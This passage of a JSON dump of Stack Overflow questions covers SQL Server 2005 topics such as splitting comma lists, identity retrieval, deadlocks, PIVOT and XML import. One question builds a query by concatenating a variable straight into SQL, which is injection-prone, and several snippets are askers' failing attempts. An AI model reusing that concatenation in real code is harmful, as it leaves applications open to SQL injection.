</p>\n\n<p>now i want to pass all selected values from dropdownlist to sql server 2005 stored procedure as parameters.</p>\n\n<p>i want to Pass the array of selected values as a string, each array item separated by a ','</p>\n\n<p>And in stored procedure i want to retrieve each values one by one. \n(using split function or any better option ? ) </p>\n\n<p>and i want to process insert query on each selected parameters.</p>\n\n<p>any help please. </p>\n\n<p>I have tried This Stored Procedure.</p>\n\n<pre><code>CREATE PROCEDURE [dbo].[TEST_LIST] \n@ID_LIST VARCHAR(200)\n</code></pre>\n\n<p>AS<br>\n   DECLARE @pos        int,\n           @nextpos    int,\n           @valuelen   int</p>\n\n<p>SELECT @pos = 0, @nextpos = 1</p>\n\n<p>WHILE @nextpos > 0\n   BEGIN\n      SELECT @nextpos = charindex(',', @ID_LIST, @pos + 1)\n      SELECT @valuelen = CASE WHEN @nextpos > 0\n                              THEN @nextpos\n                              ELSE len(@ID_LIST) + 1\n                         END - @pos - 1</p>\n\n<pre><code>  INSERT INTO TABLE \n    (ID)\n     VALUES (convert(int, substring(@ID_LIST, @pos + 1, @valuelen)))\n  SELECT @pos = @nextpos\n</code></pre>\n\n<p>END\n   RETURN\nEND</p>\n\n<p>BUT IS THIS CORRECT ??</p>\n\n<p>I GOT ERROR. </p>\n\n<p>please note this > one by one i want to retrieve parameters and at each time i have insert query.</p>\n"},{"tags":["sql","sql-server-2005","triggers"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":2905,"score":2,"question_id":3454242,"title":"Will using the TABLOCK and HOLDLOCK hints in SQL Server 2005 COMPLETELY prevent inserts until the end of the transaction?","body":"<p>I need to retrieve the identity field generated by SQL Server 2005. Usually I would just use SCOPE_IDENTITY or add an OUTPUT CLAUSE to the insert, however neither of these method help in this situation: as there is an INSTEAD OF trigger attached to the table. Next I considered @@IDENTITY, but as there is also another trigger attached to the table, this is no good either. So I figured I'd have to use IDENT_CURRENT. However as this is not session safe I need some way to ensure no other session can insert into the table until I have retrieved the new ID. I've experimented with using the TABLOCK and HOLDLOCK hints, this seems to work, but I'm not a DBA. So my question is, will using the TABLOCK and HOLDLOCK hints in SQL Server 2005 COMPLETELY prevent inserts until the end of the transaction?</p>\n\n<p>Hopefully this contrived example will explain the situation. (I realise that, functionally,  a stored procedure could replace both the triggers in this case.)</p>\n\n<pre><code>CREATE TABLE Person\n(\n PersonID  INT IDENTITY PRIMARY KEY,\n FirstName VARCHAR(50)\n);\nGO\n\nCREATE TABLE PersonHistory\n(\n PersonHistoryID INT IDENTITY(5,1) PRIMARY KEY,\n PersonId INT,\n FirstName VARCHAR(50)\n);\nGO\n\nCREATE TRIGGER PersonAudit ON Person\nAFTER Insert\nAS\nINSERT INTO PersonHistory (PersonID, FirstName)\nSELECT Inserted.PersonID, Inserted.FirstName\nFROM Inserted;\nGO\n\nCREATE TRIGGER PersonCleaner ON Person\nINSTEAD OF Insert\nAS\nINSERT INTO Person (FirstName)\nSELECT UPPER(Inserted.FirstName)\nFROM Inserted;\nGO\n\nBEGIN TRAN;\n\nINSERT INTO Person WITH (TABLOCK, HOLDLOCK) (FirstName) \nVALUES ('George');\n\n--SELECT @@IDENTITY AS '@@IDENTITY'; -- 5 \n--SELECT IDENT_CURRENT('Person') AS 'IDENT_CURRENT'; -- 1\n--SELECT SCOPE_IDENTITY() AS 'SCOPE_IDENITIY'; -- NULL\n\nDECLARE @PersonID int;\nSELECT @PersonID = IDENT_CURRENT('Person');\nSELECT @PersonID; -- 1\n\nCOMMIT TRAN;\n\n--SELECT * FROM Person;\n--SELECT * FROM PersonHistory;\n\nDROP TABLE Person;\nDROP TABLE PersonHistory;\n</code></pre>\n"},{"tags":["sql","tsql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":96,"score":3,"question_id":12887988,"title":"Select data by date and sum data - SQL Server 2005","body":"<p>I'm coming from MySQL and trying to code T-SQL on SQL Server 2005, and I'm finding it completely different.</p>\n\n<p>Here's what I want to do (using MySQL)</p>\n\n<pre><code>select sum(datapoint) as sum, date(mytimestamp) as date\nfrom datalog\nwhere datapoint = '27'\ngroup by date\n</code></pre>\n\n<p>i.e. get a list of data summed and grouped by date.</p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql"],"answer_count":4,"favorite_count":5,"up_vote_count":9,"down_vote_count":0,"view_count":6870,"score":9,"question_id":1427469,"title":"Compare dates in T-SQL, ignoring the time part","body":"<p>I'm using MS SQL 2005, and I want to check two dates for equality, but ignoring the time part.</p>\n\n<p>I know I can make use of <a href=\"http://msdn.microsoft.com/en-us/library/ms189794.aspx\">DATEDIFF</a>, but am concerned that it may be slow - this SP gets used in the DB a lot!</p>\n\n<p>Any suggestions?</p>\n\n<p><b>Edit:</b> David Andres' comment: <blockquote>'\"comparison\" includes much more than equality' </blockquote> made me realise that I didn't make my question clear enough - I am actually just checking for equality, that is all.</p>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":227,"score":2,"question_id":2763295,"title":"what is the diffrence between truncate and delete in sql server?","body":"<p>can anybody provide me list of all diffrences between truncate and delete in SQL server?</p>\n"},{"tags":["sql-server-2005","deadlock","database-deadlocks"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":102,"score":0,"question_id":12646702,"title":"Deadlock between Delete and Update","body":"<p>First process:</p>\n\n<pre><code>&lt;deadlock-list&gt;\n &lt;deadlock victim=\"process8d9798\"&gt;\n  &lt;process-list&gt;\n   &lt;process id=\"process8d9798\" taskpriority=\"0\" logused=\"0\" waitresource=\"PAGE:\n    5:1:190354\" waittime=\"3203\" ownerId=\"53807810\" transactionname=\"DELETE\" \n    lasttranstarted=\"11:29:29.153\" XDES=\"0x3dbb518\" lockMode=\"U\" \n    schedulerid=\"2\" kpid=\"1792\" status=\"suspended\" spid=\"57\" sbid=\"0\" ecid=\"1\" \n    priority=\"0\" transcount=\"0\" lastbatchstarted=\"2012-09-28T11:29:29.120\" \n    lastbatchcompleted=\"11:29:29.120\" clientapp=\".Net SqlClient Data Provider\" \n    hostname=\"xxx\" hostpid=\"4460\" isolationlevel=\"read uncommitted (1)\" \n    xactid=\"53807810\" currentdb=\"5\" lockTimeout=\"4294967295\" clientoption1=\"671088672\" \n    clientoption2=\"128056\"&gt;\n    &lt;executionStack&gt;\n     &lt;frame procname=\"Chooser2.dbo.DeleteUserSelections\" line=\"15\" stmtstart=\"360\"\n     stmtend=\"464\" sqlhandle=\"0x030005008839117bf599a500099800000100000000000000\"&gt;\n   DELETE UserPlanOption\n    WHERE UserID = @userId     &lt;/frame&gt;\n    &lt;/executionStack&gt;\n    &lt;inputbuf&gt;\n    &lt;/inputbuf&gt;\n   &lt;/process&gt;\n</code></pre>\n\n<p>Second process:</p>\n\n<pre><code>   &lt;process id=\"processb84988\" taskpriority=\"0\" logused=\"1744\" waitresource=\"PAGE:\n    5:1:190487\" waittime=\"3203\" ownerId=\"53807415\" transactionname=\"user_transaction\" \n   lasttranstarted=\"11:29:13.513\" XDES=\"0x2fc4e6e0\" lockMode=\"IU\" \n   schedulerid=\"4\" kpid=\"4628\" status=\"suspended\" spid=\"52\" sbid=\"0\" ecid=\"0\" \n   priority=\"0\" transcount=\"2\" lastbatchstarted=\"11:29:13.513\" \n   lastbatchcompleted=\"11:29:13.513\" \n   clientapp=\".Net SqlClient Data Provider\" hostname=\"xxx\" \n   hostpid=\"4460\" loginname=\"chooserpd\" isolationlevel=\"read uncommitted (1)\" \n   xactid=\"53807415\" currentdb=\"5\" lockTimeout=\"4294967295\" clientoption1=\"671088672\" \n   clientoption2=\"128056\"&gt;\n    &lt;executionStack&gt;\n     &lt;frame procname=\"Eligibility\" line=\"149\" stmtstart=\"10566\" \n   stmtend=\"11604\" sqlhandle=\"0x03000500171b4f52c1a6e200ada000000100000000000000\"&gt;\nUPDATE  UserPlanOption \n    SET     RateID = r.ID\n    FROM    [User] u WITH (NOLOCK)\n        LEFT JOIN Rate r ON r.FamilyTierID = u.FamilyTierID \n    WHERE   UserPlanOption.PlanOptionID NOT IN (SELECT ppo.PlanOptionID FROM \n                    @PORACPlanOptions ppo) AND\n        u.ID = @userID AND u.ID = UserPlanOption.UserID AND\n        r.PlanOptionID = UserPlanOption.PlanOptionID AND\n        r.Criterion1 = dbo.GetPlanOptionAreaID_36()\n      &lt;/frame&gt;\n    &lt;/executionStack&gt;\n    &lt;inputbuf&gt;\nProc [Database Id = 5 Object Id = 1380915991]    &lt;/inputbuf&gt;\n   &lt;/process&gt;\n  &lt;/process-list&gt;\n</code></pre>\n\n<p>Resource list:</p>\n\n<pre><code>  &lt;resource-list&gt;\n   &lt;pagelock fileid=\"1\" pageid=\"190354\" dbid=\"5\" objectname=\"UserPlanOption\" \n   id=\"lock1e482d80\" mode=\"IX\" associatedObjectId=\"72057594060996608\"&gt;\n    &lt;owner-list&gt;\n     &lt;owner id=\"processb84988\" mode=\"IX\"/&gt;\n    &lt;/owner-list&gt;\n    &lt;waiter-list&gt;\n     &lt;waiter id=\"process8d9798\" mode=\"U\" requestType=\"wait\"/&gt;\n    &lt;/waiter-list&gt;\n   &lt;/pagelock&gt;\n   &lt;pagelock fileid=\"1\" pageid=\"190487\" dbid=\"5\" objectname=\"UserPlanOption\" \n   id=\"lock25b32a80\" mode=\"U\" associatedObjectId=\"72057594060996608\"&gt;\n    &lt;owner-list&gt;\n     &lt;owner id=\"process8d9798\" mode=\"U\"/&gt;\n    &lt;/owner-list&gt;\n    &lt;waiter-list&gt;\n     &lt;waiter id=\"processb84988\" mode=\"IU\" requestType=\"wait\"/&gt;\n    &lt;/waiter-list&gt;\n   &lt;/pagelock&gt;\n  &lt;/resource-list&gt;\n &lt;/deadlock&gt;\n&lt;/deadlock-list&gt;\n</code></pre>\n\n<p>The table \"UserPlanOption has a composite PK (UserId and PlanOptionId). Why does the delete cause a page lock? Can someone help me understand what is going on? What confused me for a while was that I thought the deadlock would be caused by subsequent queries from the same client, but that's not possible. These must be different clients hitting the same web page.</p>\n\n<p>Actually, I guess I know the answer to the first question - deleting a range will require a page lock. But how can I get around this?</p>\n\n<p>Results from index query:</p>\n\n<pre><code>name                type type_desc is_unique data_space_id ignore_dup_key \n------------------- ---- --------- --------- ------------- -------------- \nPK_UserPlanOption_1 1    CLUSTERED 1         1             0              \n\n\nis_primary_key is_unique_constraint fill_factor is_padded is_disabled \n-------------- -------------------- ----------- --------- ----------- \n1              0                    0           0         0           \n\nis_hypothetical allow_row_locks allow_page_locks\n--------------- --------------- ----------------\n0               1               1\n</code></pre>\n\n<p>Execution plans for the <a href=\"http://heeroz.com/update.sqlplan\" rel=\"nofollow\">update</a> and the <a href=\"http://heeroz.com/delete.sqlplan\" rel=\"nofollow\">delete</a>.</p>\n"},{"tags":["sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":6,"view_count":44,"score":-6,"question_id":12880717,"title":"How to install SQL SeErver 2005 Express on x64 windows 7","body":"<p>I have a windows 7 home premium 64-bit laptop and I  want to install SQL Server 2005 Express edition engine for windows 7 x64  how can I install?</p>\n\n<p>Please provide download link &amp; installation guide</p>\n"},{"tags":["sql-server-2005","business-intelligence","sql-server-2012"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":6,"view_count":41,"score":-6,"question_id":12880744,"title":"Data migration = how?","body":"<p>If a company need to do some data migration from SQL Server 2005 to 2012 included SSIS, SSRS and SSAS.</p>\n\n<p>How should I do it and what best practice do you suggest?</p>\n\n<p>Please remember that I'm a newbie in data migration.</p>\n\n<p>The company has about 2000 employer and they use SQL server only.</p>\n"},{"tags":["sql","sql-server-2005","backup","database-backups"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":492,"score":0,"question_id":11472366,"title":"SQL Server Backup (not restore!) error: The media set has 2 media families but only 1 are provided. All members must be provided","body":"<p>I am running into this error when trying to Backup a database:</p>\n\n<blockquote>\n  <p>\"The media set has 2 media families but only 1 are provided. All\n  members must be provided.\"</p>\n</blockquote>\n\n<p>Please note this is on BACKUP not on restore.</p>\n\n<p>There are a lot of topics on this error for RESTORE, but I didn't find any for BACKUP.</p>\n\n<p>I am using this T.SQL on Sql Server 2005:</p>\n\n<pre><code>backup database dtplog\nTO DISK='e:\\dtplog.bak'\n</code></pre>\n\n<p>So it looks like SQL Server has some kind of setting specified there are multiple backup devices for this database.</p>\n\n<p>For some databases I don't get this error, but for some I do.</p>\n\n<p>Any idea what's happening?</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":59,"score":3,"question_id":12875480,"title":"How can I pass @VAR + magic numbers to a stored procedure parameter in a sql script?","body":"<p>Lets say I have a stored proc call <code>MyStoredProc</code> which recieved an int <code>(@MyParam INT)</code> datatype.</p>\n\n<p>Let's say I have an int declared in a script like this...</p>\n\n<pre><code>DECLARE @MyVar INT ;\nSET @MyVar = 101 ;\n</code></pre>\n\n<p>I just wrote a long sql script where I do a LOT of this...</p>\n\n<pre><code>EXEC MyStoredProc @MyVar + 1  ;\n</code></pre>\n\n<p>I am shocked that this is causing a syntax error warning.</p>\n\n<p>I can do this...  </p>\n\n<pre><code>EXEC MyStoredProc @MyVar ;\n</code></pre>\n\n<p>and I can do this...   </p>\n\n<pre><code>EXEC MyStoredProc 101 ;\n</code></pre>\n\n<p>but I can't do this...   </p>\n\n<pre><code>EXEC MyStoredProc @MyVar + 1  ;\n</code></pre>\n\n<p>This is going to make my script a LOT harder to write unless I am missing something.  This is for SQL 2005.</p>\n"},{"tags":["sql-server-2005","stored-procedures","sql-server-2000","asp.net-4.0"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12873313,"title":"Creating a complex stored-procedure to get multi-tables output","body":"<p>I have product catalog that have two levels of categories and brands associated with the products.</p>\n\n<p>Tables Like:</p>\n\n<p>Products : ProductID | CategoryID | BrandID</p>\n\n<p>Categories : CategoryID | ParentID | Image(bit)</p>\n\n<p>What I need is while browsing the brands pages I select all \"Parent Categories\" that are parents for categories associated with products added already under this brand using a Stored Procedure... and make sure to get the value of the Image column</p>\n\n<h1>What I Used</h1>\n\n<pre><code>CREATE PROCEDURE [dbo].[GetBrandProductsCats]\n@iLanguageID int,\n@iBrandID int\nAs\nBegin\nSELECT C.Image, C.CategoryID, C.ParentID,CD.Title, CD.Summary, BrandID = @iBrandID\nFROM Categories C\n    Join CategoryData CD on C.ParentID = CD.CategoryID\nWHERE C.CategoryID in \n    (SELECT Products.CategoryID  \n     FROM Products \n     WHERE Products.BrandID = @iBrandID)\n\nEnd\nGO\n</code></pre>\n\n<p>This actually worked but the Image column value is not for the parent category</p>\n\n<p>Any Ideas ? wish you have one cause I got tired :)</p>\n\n<p>Thank you all in advance</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005","pivot"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":146,"score":1,"question_id":11847584,"title":"Transposing Rows in to colums in SQL Server 2005","body":"<p>I have an sql query \"Select * from tablename\" whose output is </p>\n\n<pre><code>col1   col2       \n  A     1 \n  B     2 \n  C     3\n</code></pre>\n\n<p>I want to modify the above output to below as following</p>\n\n<pre><code>A      B      C\n1      2      3 \n</code></pre>\n\n<p>Please let me know how could I achieve this</p>\n"},{"tags":["sql-server","sql-server-2005","tsql","insert"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":248,"score":2,"question_id":3004282,"title":"In SQL Server, how can I insert data into a table that has just one column which is of identity type?","body":"<p>In SQL Server, how can I insert data into a table that has just one column which is of identity type?\nSuch as insert into the following table <strong>t</strong>.\nHow can I write the insert statement?</p>\n\n<pre><code>CREATE TABLE t\n(\n    id INT IDENTITY(1, 1) PRIMARY KEY\n)\n</code></pre>\n\n<p>Great thanks.</p>\n"},{"tags":["sql-server","sql-server-2005","windows-7"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":3595,"score":1,"question_id":5065338,"title":"How can I resolve error 233 in SQL Server 2005 under Windows 7?","body":"<p>I'm creating a new login with SQL Server authentication. Once the login is created, I then try to connect to the database using SQL Server authentication. This produces the following error:</p>\n\n<blockquote>\n  <p>Cannot connect to (SERVER NAME) i.e machine name/sql\\express </p>\n</blockquote>\n\n<p>Additional Information:</p>\n\n<blockquote>\n  <p>A connection was successfully\n  established with the server, but then\n  an error  occurred during the login\n  process.  (provider: Shared Memory\n  Provider,  error: 0 - No process is on\n  the other end of the pipe.) \n  (Microsoft SQL  Server, Error: 223)</p>\n</blockquote>\n\n<p>Here is what I have already tried for troubleshooting:</p>\n\n<ul>\n<li>Enabling all the protocols</li>\n<li>Ensuring that I am running as Administrator</li>\n<li>Setting the Authentication Mode to Windows and SQL Server Authentication</li>\n</ul>\n\n<p>Unfortunately, none of these steps seem to have worked. How can I fix this error?</p>\n"},{"tags":["php","xml","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12864952,"title":"Using PHP and SQL Server 2005, can I return data from an XML field and convert to a string?","body":"<p>I have a SQL Server 2005 table which has XML snippets in an xml column. To properly use XSL to convert the snippets to XHTML, I need to surround the snippet with additional nodes, etc. My thought is that I need to be able to handle the XML data as a string, then I can prepend and postpend to it and then convert to a DOM object.</p>\n\n<p>Is this the right way to go? Is there a better way?</p>\n\n<p>Here is an example of where I need to put the snippet (which can be fairly large): </p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;document xmlns=\"urn:hl7-org:v3\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"urn:hl7-org:v3 http://www.accessdata.fda.gov/spl/schema/spl.xsd\"&gt;\n    &lt;id /&gt;\n    &lt;code /&gt;\n    &lt;effectiveTime  /&gt;\n    &lt;component&gt;\n        &lt;structuredBody&gt;\n            &lt;&lt; SNIPPET GOES HERE &gt;&gt;\n        &lt;/structuredBody&gt;\n    &lt;/component&gt;\n&lt;/document&gt;\n</code></pre>\n"},{"tags":["sql-server","tsql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":12864058,"title":"SQL Server 2005 PIVOT Syntax Error","body":"<p>I receive the following error</p>\n\n<p>Msg 156, Level 15, State 1, Line 10\nIncorrect syntax near the keyword 'SELECT'.\nMsg 102, Level 15, State 1, Line 10\nIncorrect syntax near ')'.</p>\n\n<p>When I run the following query</p>\n\n<pre><code> SELECT TOP 100 *\nFROM\n(\nSELECT [TimeStamp],[MeterID],[Value]\nFROM access_AMIData) AS source\nPIVOT\n(\nSUM(Value)\nFOR MeterID IN (SELECT MeterNumber FROM access_tblFcppPvMeterList)\n) as pvt\nORDER BY TimeStamp\n</code></pre>\n\n<p>The error comes with this line:</p>\n\n<pre><code>FOR MeterID IN (SELECT MeterNumber FROM access_tblFcppPvMeterList)\n</code></pre>\n\n<p>If I change this line to:</p>\n\n<pre><code>FOR MeterID IN (1,2,3,4)\n</code></pre>\n\n<p>It works perfectly...how can I specify a select Query inside the IN?</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005","pivot"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":71,"score":-2,"question_id":12862916,"title":"SQL Server 2005 Rows to Columns","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/10652921/t-sql-group-rows-into-columns\">T-SQL Group Rows Into Columns</a>  </p>\n</blockquote>\n\n\n\n<p>I have a table _data that is formatted like this</p>\n\n<pre><code>TimeStamp                        MeterID      Value\n2012-04-15 13:00:00.000          CK1992       152.64\n2012-04-15 12:45:00.000          CK1992       151.695\n2012-07-06 12:45:00.000          CK1992       150.84\n2012-09-04 12:00:00.000          CK1992       150.66\n2012-04-15 12:15:00.000          CK1992       150.57\n</code></pre>\n\n<p>I need to be able to format that table as something like this</p>\n\n<pre><code>Timestamp     MeterID1     MeterID2     MeterID3\nstamphere     value        value        value\n</code></pre>\n\n<p>I have a lot of different MeterIDs so it needs extract it accordingly.</p>\n\n<p>Here is my existing select statement:</p>\n\n<pre><code>SELECT [TimeStamp]\n  ,[MeterID]\n  ,[Value]\nFROM [dbo].[_Data]\n</code></pre>\n\n<p>How can I make this work? Thanks for your help!</p>\n"},{"tags":["database","sql-server-2005"],"answer_count":14,"favorite_count":3,"up_vote_count":6,"down_vote_count":1,"view_count":3232,"score":5,"question_id":707117,"title":"SQL 'ORDER BY' slowness","body":"<p>Is it true that <code>ORDER BY</code> is generally pretty slow? I am trying to run some sql statements where the <code>WHERE</code> clause is pretty simple, but then I am trying an <code>ORDER BY</code> on a <code>VARCHAR(50)</code> indexed column.</p>\n\n<p>I need to sort alphabetically for display reasons. I figured that getting the database to do it for me is the most efficient. </p>\n\n<p>At this point, I am looking to either </p>\n\n<ul>\n<li>optimize the sql query</li>\n<li>sort the result set in code </li>\n</ul>\n\n<p>Here is the actual query I am trying to run:</p>\n\n<pre><code>// B.SYNTAX is a TEXT/CLOB field\n// Indexes on NAME, MODULENAME. PREVIOUS is a CHAR(1) with no index\n\"SELECT A.NAME, B.SYNTAX, B.DESCRIPTION, A.RATE1, A.RATE2, \nA.RATE3, A.STARTDATE, A.ENDDATE, A.HIDE, A.CATEGORYNAME \nFROM A, B WHERE A.MODULENAME='\"+loadedModuleName+\"' \nAND A.NAME = B.NAME AND (A.PREVIOUS&lt;&gt;'N' OR A.PREVIOUS IS NULL) \nORDER BY A.NAME\"\n</code></pre>\n\n<p>The size of table A is ~2000 rows and B is about ~500.</p>\n\n<p>I should probably also mention that I cannot do much database specific optimization since we support multiple databases. Also, the application is deployed at a customer site.</p>\n\n<p>I am expecting hundreds of records to be returned (less than 1000).</p>\n\n<p>What would you do? Any tips are appreciated. Thanks.</p>\n"},{"tags":["sql-server-2005","stored-procedures","asynchronous"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12862356,"title":"Asynchronous stored procedure","body":"<p>Given the following two SQL Server 2005 stored procedures (samples only):</p>\n\n<p><strong>ProcA:</strong></p>\n\n<pre><code>ALTER PROCEDURE [dbo].[ProcA]\nAS\nBEGIN\n    EXEC ProcB\nEND\n</code></pre>\n\n<p><strong>ProcB:</strong></p>\n\n<pre><code>ALTER PROCEDURE [dbo].[ProcB]\nAS\nBEGIN\n    WAITFOR DELAY '000:00:10'\nEND\n</code></pre>\n\n<p>When <code>ProcA</code> is executed, it predictably takes 10 seconds since it is waiting for <code>ProcB</code> to complete. </p>\n\n<p>Is it possible to have <code>ProcA</code> call <code>ProcB</code> <strong>asynchronously</strong>, so that <code>ProcA</code> returns as soon as it has called <code>ProcB</code> and does not wait for <code>ProcB</code> to complete before returning?</p>\n"},{"tags":["xml","sql-server-2005","microsoft","bulk-load"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":54,"score":1,"question_id":12860334,"title":"XML file import to SQL database with multiple children","body":"<p>I'm trying to import an XML file into a SQL Server database. Please have a look on the code and on the xml file. Thanks in advance. </p>\n\n<p>I tried to google lot of pages but all of them deal with only one child (or how to call it). </p>\n\n<p>But In my real xml the structure is like </p>\n\n<pre><code>:1x supplier --&gt; multiple orders --&gt; multiple customers --&gt; multiple products. \n</code></pre>\n\n<p>We need to create a stored procedure which will be called when we get the XML file. </p>\n\n<p>Thanks again Petr</p>\n\n<p>SQL code:</p>\n\n<pre><code>DROP TABLE #TEST\n\nCREATE TABLE #TEST\n(CUSTID VARCHAR(10),CUSTNAME VARCHAR(50),PRODUCT VARCHAR(500))\n\nINSERT INTO #TEST(CUSTID,CUSTNAME,PRODUCT)\nSELECT\n    x.orders.query('order/customer/cust_id').value('.', 'VARCHAR(10)'),\n    x.orders.query('order/customer/name').value('.', 'VARCHAR(50)'),\n    x.orders.query('order/product_lines/product/supplier_prod_num').\n   value('.','VARCHAR(500)') \nFROM\n   (SELECT CAST(x AS XML)\n    FROM OPENROWSET(\n          BULK '\\\\test\\Test.xml',\n          SINGLE_BLOB) AS T(x)) AS T(x) \n    CROSS APPLY\n        x.nodes('order_batch/orders/order/product_lines/product') AS x(orders)\n\nselect * from #test\n</code></pre>\n\n<p>XML file to test:</p>\n\n<pre><code>&lt;order_batch&gt;\n  &lt;order_header&gt;\n    &lt;doc_format_ver&gt;1.0&lt;/doc_format_ver&gt;\n    &lt;originating_software&gt;\n      &lt;software_name&gt;test&lt;/software_name&gt;\n      &lt;software_ver&gt;2.0&lt;/software_ver&gt;\n    &lt;/originating_software&gt;\n  &lt;/order_header&gt;\n  &lt;supplier&gt;\n    &lt;cp_supplier_id&gt;93&lt;/cp_supplier_id&gt;\n    &lt;name&gt;supname&lt;/name&gt;\n    &lt;address_line_1&gt;address_line_1&lt;/address_line_1&gt;\n    &lt;address_line_2&gt;address_line_1&lt;/address_line_2&gt;\n  &lt;/supplier&gt;\n  &lt;orders&gt;\n    &lt;order o_count=\"1\"&gt;\n      &lt;customer&gt;\n        &lt;cust_id&gt;7240&lt;/cust_id&gt;\n        &lt;name&gt;CustNamek&lt;/name&gt;\n        &lt;address_line_1&gt;address_line_1&lt;/address_line_1&gt;\n        &lt;address_line_2&gt;address_line_1&lt;/address_line_2&gt;\n      &lt;/customer&gt;\n      &lt;order_details&gt;\n        &lt;date_created&gt;2012-10-08&lt;/date_created&gt;\n        &lt;time_created&gt;05:37:11&lt;/time_created&gt;\n      &lt;/order_details&gt;\n      &lt;product_lines&gt;\n        &lt;product p_count=\"1\"&gt;\n          &lt;supplier_prod_num&gt;15115&lt;/supplier_prod_num&gt;\n          &lt;qty_type&gt;E&lt;/qty_type&gt;\n        &lt;/product&gt;\n        &lt;product p_count=\"2\"&gt;\n          &lt;supplier_prod_num&gt;010211&lt;/supplier_prod_num&gt;\n          &lt;qty_type&gt;E&lt;/qty_type&gt;\n        &lt;/product&gt;\n      &lt;/product_lines&gt;\n    &lt;/order&gt;\n    &lt;order o_count=\"2\"&gt;\n      &lt;customer&gt;\n        &lt;cust_id&gt;7238&lt;/cust_id&gt;\n        &lt;name&gt;custname&lt;/name&gt;\n        &lt;address_line_1&gt;address_line_1&lt;/address_line_1&gt;\n        &lt;address_line_2&gt;address_line_1&lt;/address_line_2&gt;\n      &lt;/customer&gt;\n      &lt;order_details&gt;\n        &lt;supplier_ref&gt;0093513982&lt;/supplier_ref&gt;\n        &lt;delivery_date&gt;2012-10-08&lt;/delivery_date&gt;\n        &lt;special_instructions /&gt;\n      &lt;/order_details&gt;\n      &lt;product_lines&gt;\n        &lt;product p_count=\"1\"&gt;\n          &lt;supplier_prod_num&gt;6748&lt;/supplier_prod_num&gt;\n          &lt;qty_type&gt;E&lt;/qty_type&gt;\n        &lt;/product&gt;\n        &lt;product p_count=\"2\"&gt;\n          &lt;supplier_prod_num&gt;6744&lt;/supplier_prod_num&gt;\n          &lt;qty_type&gt;E&lt;/qty_type&gt;\n        &lt;/product&gt;\n      &lt;/product_lines&gt;\n    &lt;/order&gt;\n  &lt;/orders&gt;\n&lt;/order_batch&gt;\n</code></pre>\n"},{"tags":["c#","sql-server-2005","datetime"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":6,"view_count":468,"score":-6,"question_id":10991658,"title":"How to insert DateTime into SQL Server 2005 database","body":"<p>I have a C# windows forms (standalone) app where user needs to pick desired date time and when click a save button, that has to be stored into the database.</p>\n\n<ol>\n<li>how do I display a calendar on my form (with a text box) user to pick any date?</li>\n<li>which type of column should I create in my database table (in SQL Server 2005) to store the date and time entered by user? </li>\n<li>how do I retrieve the date and time from the database and display it in a text box?</li>\n</ol>\n\n<p>Thanks.</p>\n"},{"tags":["sql-server-2005","tsql","aggregate-functions"],"answer_count":8,"favorite_count":3,"up_vote_count":6,"down_vote_count":0,"view_count":10499,"score":6,"question_id":773417,"title":"Aggregate SQL Function to grab only the first from each group","body":"<p>I have 2 tables - an Account table and a Users table.  Each account can have multiple users.  I have a scenario where I want to execute a single query/join against these two tables, but I want all the Account data (Account.*) and only the <em>first</em> set of user data (specifically their name).</p>\n\n<p>Instead of doing a \"min\" or \"max\" on my aggregated group, I wanted to do a \"first\".  But, apparently, there is no \"First\" aggregate function in TSQL.</p>\n\n<p>Any suggestions on how to go about getting this query?  Obviously, it is easy to get the cartesian product of Account x Users:</p>\n\n<pre><code> SELECT User.Name, Account.* FROM Account, User\n WHERE Account.ID = User.Account_ID\n</code></pre>\n\n<p>But how might I got about only getting the first user from the product based on the order of their User.ID ?</p>\n"},{"tags":["sql","sql-server-2005","foreign-keys"],"answer_count":2,"favorite_count":3,"up_vote_count":10,"down_vote_count":0,"view_count":8133,"score":10,"question_id":869081,"title":"A way to check if foreign key exists in SQL 2005","body":"<p>Is there an easy way to check if a foreign key exists for a column in a table? I am writing a script which will add the foreign key only if it does not exist.</p>\n\n<p>Thanks</p>\n"},{"tags":["sql-server-2005","full-text-search","full-text-indexing"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12857235,"title":"Query searched in FullText Search","body":"<p>I'm having a very specific issue with Full - Text Index search.</p>\n\n<p>I'm trying to search as follows:</p>\n\n<pre><code>Contains(Searchfield,'IT`dash`10116')\n</code></pre>\n\n<p>Using SQL 2008, I found that it looks for an exact match of '<strong>IT`dash`10116</strong>'. Also, I confirmed that the term '<strong>IT`dash`10116</strong>' is indexed in the table.</p>\n\n<p>In my dev server which is SQL Server 